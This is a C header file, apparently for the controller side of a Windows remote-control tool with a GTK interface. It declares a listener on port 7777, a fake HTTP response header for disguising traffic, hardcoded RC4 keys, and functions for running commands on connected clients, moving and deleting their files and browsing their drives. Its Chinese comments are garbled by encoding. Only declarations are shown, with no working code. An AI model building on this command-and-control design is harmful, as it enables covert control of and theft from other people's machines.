#ifndef _GLOBAL_H_
#define _GLOBAL_H_

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#include <gtk/gtk.h>

#pragma comment(lib,"ws2_32.lib")

#define MAX_SIZE 1460
#define KEY "46883f43e3202a298b9a51f863e54a54"

///////////////////////////////ȫ�ֱ���////////////////////////////////

int LISTEN_PORT=7777;             //�����˿�

char *HTTP_Header="HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: Keep-Alive\r\n\r\n";

unsigned char RC4_KEY[256]={"69d1901efbe0de05c63a9caa8ea76cd9"};
unsigned char S_box[256]={0};

typedef struct
{
    char key[33];
	int order;          //��ǰ�׽�������,1:ִ������,2:�ϴ��ļ�,3:�����ļ�
	int HTTP_Proxy;     //0:��ͨ��HTTP��������,1:ͨ��HTTP��������
    char name[255];
    char ip[20];
	char OS[100];
} ClientInfo;

typedef struct ClientList
{
    //ÿһ���ͻ��˵ı�ź���Ϣ
    SOCKET soc;
    char name[255];
    char ip[20];
	char OS[100];
	int HTTP_Proxy;
    struct ClientList *next;
} ClientListNode;

typedef struct
{
    SOCKET soc;
	int HTTP_Proxy;
    int order;   //1:ִ������,2:�ϴ��ļ�,3:�����ļ�,4:�Ͽ�����,5:�ļ����
    char localpath[255];
    char remotepath[255];
	GtkWidget *pbar;    //����������ָ��
} ControlClient;

typedef struct
{
	unsigned long TotalSize;
	int index;
}DownloadFileStruct;

typedef struct  CommandRecord
{
	char *cmd;    //��¼��ִ�й�������
	struct CommandRecord *front;
	struct CommandRecord *next;
}CommandRecordNode;

typedef struct
{
    //�ص��ṹ
    ClientListNode Client;
    WSAOVERLAPPED overlap;
    WSABUF WSAbuffer;
    char RecvBuffer[MAX_SIZE+1];           //���ݽ��ջ�����
	char download_path[255];
    CommandRecordNode *cmdrecord;
	int OrderStatus;            //1:ִ������,2:�ϴ��ļ�,3:�����ļ�
	unsigned long int time;              //���յ�������Ϣ��ʱ��
    DWORD NumberOfBytesRecvd;
    DWORD flags;
} IO_OPERATION_DATA;

typedef struct  
{
	char title[50];
	char content[MAX_SIZE];
}MessageStruct;

typedef struct  
{
	int end_flag;      //������ʶ,1:��δ����,0:�Ѿ�����
	int type_flag;     //1:���������б�,2:�ļ����б�,3:�ļ��б�
	char content[1452];
}FileExplorerStruct;

typedef struct
{
	int index;
	SOCKET soc;
	SOCKET ClientSocket;
	int buffer_type;     //1:drive,2:folder,3:file
	int tran_file_flag;  //1:�ϴ��ļ�,2:�����ļ�
	int refresh_flag;    //1:ˢ��,0:�޶���
	int exit_flag;       //0:���˳�,1:�߳��˳�
	int delete_flag;     //0:�޶���,1:���ļ�Ҫɾ��
	char path[MAX_SIZE]; //ANSI
	char *filename;       //UTF8
	char *buffer;
	GtkListStore *drives_list_store;
	GtkListStore *folders_list_store;
	GtkListStore *files_list_store;
	GtkWidget *path_label;
	GtkWidget *drives_tree_view;
	GtkWidget *folders_tree_view;
	GtkWidget *files_tree_view;
	GtkTreeSelection *drive_selection;
	GtkTreeSelection *folder_selection;
	GtkTreeSelection *file_selection;
	GtkFileSelection *LocalFileSelection;
	GtkWidget *rename_window;
	GtkWidget *rename_filename_entry;
	CRITICAL_SECTION cs;
}Explorer_Struct;

int TotalConnection=0;                   //��������
int ListenThreads=0;                     //�����߳���
SOCKET *ClientSocketArray;               //�ͻ����׽�������ָ��
WSAEVENT *WSAEventArray=NULL;            //�¼�����ָ��
IO_OPERATION_DATA **IODataArray;         //IO�����ṹ��ָ������Ķ���ָ��

ClientListNode *List_Header=NULL;    //ָ��ͻ�������ͷ��ָ��
CRITICAL_SECTION CRI_List,CRI_Total,CRI_IOData,CRI_update_list,CRI_ListenThreas,CRI_UTA,CRI_ATU;   //�����ٽ�������
ControlClient CC,DownCon,UpCon;
SOCKET Command_Socket=INVALID_SOCKET,Upload_Socket=INVALID_SOCKET,Download_Socket=INVALID_SOCKET,\
File_Explorer_Socket=INVALID_SOCKET;
int UploadFileFlag=0;
GtkListStore *main_list_store;
GtkTreeSelection *selection;
///////////////////////////////////////////////////////////////////////

/*-------------------------����ԭ��----------------------------------*/
void Listen_Client(gpointer Parameter);
SOCKET GetClientSocket(int n);
int InitClientSocketArray();
int GetIndexBySocket(SOCKET ClientSocket);
int AppendCmdRecord(int index,char *cmd);
int AddClientList(ClientListNode *CLN,SOCKET ClientSocket);
int CleanupClientConnection(SOCKET ClientSocket);
int RecvClientInfo(SOCKET ClientSocket,ClientInfo *CI);
void RecvMessageFromClient(gpointer Parameter);
DWORD WINAPI SendOrderToClient(LPVOID Parameter);
void UploadFileToClient(gpointer Parameter);
void RecvFile(gpointer Parameter);
int Send_HTTP_Header(SOCKET ProxySocket,int Content_Length);
void Execute_Command(gpointer Parameter);
static int add_to_list(ClientListNode CLN);
static int remove_item(int list_index);
int Send_Command(GtkWidget *widget,gpointer pss);
void update_progressbar(GtkWidget *pbar,unsigned long total,unsigned long acc,int flag);
DWORD WINAPI _MessageBox(LPVOID Parameter);
int remove_explorer_item(GtkWidget *view,GtkListStore *store);
int add_explorer_list(GtkListStore *store,char *str);
int dispose_http_recv(char *RecvBuffer,char **buffer,int *write_len,int *sur_len,int recv_size);
void CheckHTTPOnlineClient();
/*-------------------------------------------------------------------*/

#endif   //_GLOBAL_H_